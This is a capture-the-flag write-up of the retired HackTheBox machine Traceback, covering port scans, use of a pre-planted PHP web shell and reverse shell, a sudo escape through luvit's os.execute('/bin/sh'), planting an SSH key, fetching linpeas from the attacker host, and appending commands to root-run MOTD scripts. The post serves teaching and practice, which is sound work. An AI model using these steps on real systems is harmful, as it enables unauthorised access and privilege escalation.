+++
title = "HackTheBox - Traceback"
description = ""
type = ["posts","post"]
tags = [
    "HackTheBox",
    "CTF",
    "Bug",
]
date = "2020-07-14"
categories = [
    "HackTheBox",
    "CTF",
]
series = ["HackTheBox"]
[ author ]
  name = "0xSc0ut"
+++

![](https://paper-attachments.dropbox.com/s_D88239B58E0AD8374C9EC1446F44F5B3595D2F17E09DF1A9CCD36FBE59479F08_1597820753088_Screenshot+2020-08-19+at+12.35.44+PM.png)


Let’s have a look at a machine which just got retired, Traceback is my second active machine that i have solved. An interesting box which recalls everything that we have learnt so far.

Initial foothold is kind of CTF like .


----------
### Tools:


- Port Scan - Masscan and Nmap
- Privilege Escalation - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)


----------
### Initial Foothold:

As initial recon always start with scanning all open ports,

**Masscan:**


    #masscan
    open tcp 80 10.10.10.181 1591767945
    open tcp 22 10.10.10.181 1591767967
    #end

**Nmap:**


    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
    |   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
    |_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Help us
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.29: 
    |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
    |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
    |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
    |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
    |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
    |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
    |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
    |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
    |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
    |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
    |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
    |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
    |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
    |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
    |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
    |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
    |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
    |_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Adtran 424RG FTTH gateway (92%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE (using port 22/tcp)
    HOP RTT       ADDRESS
    1   517.49 ms 10.10.14.1
    2   517.03 ms 10.10.10.181

Nothing special, lets check what there in port 80


    This site has been owned
    I have left a backdoor for all the net. FREE INTERNETZZZ
    - Xh4H - 

So we are looking for an backdoor, Nice!!

While checking page source we got some other hint which would drive us


![](https://paper-attachments.dropbox.com/s_D88239B58E0AD8374C9EC1446F44F5B3595D2F17E09DF1A9CCD36FBE59479F08_1597821409552_Screenshot+2020-08-19+at+12.46.16+PM.png)


A webpage with a comment is trying to says something. 
I have a habit for surfing through google about hints while do so look what i found 😁


![](https://paper-attachments.dropbox.com/s_D88239B58E0AD8374C9EC1446F44F5B3595D2F17E09DF1A9CCD36FBE59479F08_1597821587274_Screenshot+2020-08-19+at+12.48.43+PM.png)


 
A Github repository which has collection of all possible web-shells Great!! 

This made me confident and showed me that i m in a right track 🤪

Let’s just clone that repo and try every possible web-shells 


    git clone https://github.com/TheBinitGhimire/Web-Shells.git

Finally after trying out every php file, one worked out


    http://10.10.10.181/smevk.php


    https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php


![](https://paper-attachments.dropbox.com/s_D88239B58E0AD8374C9EC1446F44F5B3595D2F17E09DF1A9CCD36FBE59479F08_1597822008342_Screenshot+2020-08-19+at+12.56.28+PM.png)


I just logged in with default credentials which was mentioned in the file and created a reverse shell


![](https://paper-attachments.dropbox.com/s_D88239B58E0AD8374C9EC1446F44F5B3595D2F17E09DF1A9CCD36FBE59479F08_1597822349155_Screenshot+2020-08-19+at+12.59.42+PM.png)



    Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
     00:33:33 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    webadmin


----------
### Privilege Escalation towards user.txt:


    $ ls -la
    total 44
    drwxr-x--- 5 webadmin sysadmin 4096 Aug 19 00:27 .
    drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
    -rw------- 1 webadmin webadmin  344 Aug 19 00:27 .bash_history
    -rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
    -rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
    drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
    drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
    -rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
    -rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
    drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
    -rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt

note.txt appears to be interesting, let’s find out whats in there


    $ cat note.txt
    - sysadmin -
    I have left a tool to practice Lua.
    I'm sure you know where to find it.
    Contact me if you have any question.

Ok so there is something related to lua

Ahhaaa!! found you


    $ sudo -l
    Matching Defaults entries for webadmin on traceback:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User webadmin may run the following commands on traceback:
        (sysadmin) NOPASSWD: /home/sysadmin/luvit

Above information conveys that **webadmin** can run **/home/sysadmin/luvit** with sudo privilege

**References:**

    - https://gtfobins.github.io/gtfobins/lua/
    - https://www.lua.org/manual/5.1/lua.html

What we need to know is “how to execute os command using lua?” 


    lua -e 'os.execute("/bin/sh")'

All set let’s go for escalation


    $ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
    id 
    uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
    whoami
    sysadmin

BOOM!!


----------


### Privilege Escalation toward root.txt:

Working without proper shell is hard, so lets add our public key in .ssh folder of sysadmin and login with that,


    root@kali:~/.ssh# ssh-keygen
    Generating public/private rsa key pair.
    Enter file in which to save the key (/root/.ssh/id_rsa): 
    /root/.ssh/id_rsa already exists.
    Overwrite (y/n)? y
    Enter passphrase (empty for no passphrase): 
    Enter same passphrase again: 
    Your identification has been saved in /root/.ssh/id_rsa.
    Your public key has been saved in /root/.ssh/id_rsa.pub.
    The key fingerprint is:
    SHA256:ujc3LS4mFE93URYAhZGg4ur8BAYunYfz1d8tRT9Nxe8 root@kali
    The key's randomart image is:
    +---[RSA 3072]----+
    |        ..o*oo+o.|
    |       .  o ..  o|
    |.   . .      .. o|
    |.o + .... . .. oo|
    |..B o .+S. .  .oo|
    |.. * ..... . o  E|
    |  . o..   ..o .  |
    | o .  ..= + ..   |
    |  o.. .+ =.o     |
    +----[SHA256]-----+

Now just copy you public key and echo it to authorized_keys using command


    echo "<---public key --->" > authorized_keys


![](https://paper-attachments.dropbox.com/s_D88239B58E0AD8374C9EC1446F44F5B3595D2F17E09DF1A9CCD36FBE59479F08_1597824460595_Screenshot+2020-08-19+at+1.37.30+PM.png)

    $ cd /tmp
    $ wget http://10.10.14.x:4545/linpeas.sh     
    --2020-08-19 01:15:07--  http://10.10.14.76:4545/linpeas.sh
    Connecting to 10.10.14.x:4545... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 233677 (228K) [text/x-sh]
    Saving to: ‘linpeas.sh’
    
    linpeas.sh                                          100%[================================================================================================================>] 228.20K   110KB/s    in 2.1s    
    
    2020-08-19 01:15:10 (110 KB/s) - ‘linpeas.sh’ saved [233677/233677]

While running linPeas.sh , found some interesting stuffs like


    [+] Interesting GROUP writable files (not in Home) (max 500)
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files        
    Group sysadmin:                                                                    
    /etc/update-motd.d/50-motd-news                                                      
    /etc/update-motd.d/10-help-text
    /etc/update-motd.d/91-release-upgrade
    /etc/update-motd.d/00-header
    /etc/update-motd.d/80-esm

Let’s move to the folder and check whats happening there


    $ ls -la
    total 32
    drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
    drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
    -rwxrwxr-x  1 root sysadmin  981 Aug 19 03:29 00-header
    -rwxrwxr-x  1 root sysadmin  982 Aug 19 03:29 10-help-text
    -rwxrwxr-x  1 root sysadmin 4264 Aug 19 03:29 50-motd-news
    -rwxrwxr-x  1 root sysadmin  604 Aug 19 03:29 80-esm
    -rwxrwxr-x  1 root sysadmin  299 Aug 19 03:29 91-release-upgrade


    $ cat 00-header 
    #!/bin/sh
    #
    #    00-header - create the header of the MOTD
    #    Copyright (C) 2009-2010 Canonical Ltd.
    #
    #    Authors: Dustin Kirkland <kirkland@canonical.com>
    #
    #    This program is free software; you can redistribute it and/or modify
    #    it under the terms of the GNU General Public License as published by
    #    the Free Software Foundation; either version 2 of the License, or
    #    (at your option) any later version.
    #
    #    This program is distributed in the hope that it will be useful,
    #    but WITHOUT ANY WARRANTY; without even the implied warranty of
    #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    #    GNU General Public License for more details.
    #
    #    You should have received a copy of the GNU General Public License along
    #    with this program; if not, write to the Free Software Foundation, Inc.,
    #    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
    
    [ -r /etc/lsb-release ] && . /etc/lsb-release
    
    
    echo "\nWelcome to Xh4H land \n"

So this is the one which greeted us while doing ssh. Since these files are world writable and executed by root user, let’s make use of this weakness to get flag from root.txt


    $ echo 'cat /root/root.txt' >> 00-header

So literally what above command does is , appends our query to 00-header file which is then executed as shown below


    root@kali:~# ssh sysadmin@10.10.10.181
    #################################
    -------- OWNED BY XH4H  ---------
    - I guess stuff could have been configured better ^^ -
    #################################
    
    Welcome to Xh4H land 
    
    {afxxxxxxxxxxxxxxxxxxxxxxxxx16} --> root.txt content
    
    
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    
    Last login: Wed Aug 19 01:27:40 2020 from 10.10.14.76

As you can see that root.txt content is displayed while we try to ssh. Likewise you can create a interactive shell by appending desired commands.
 
Thank you, Have a nice day!! 😄 

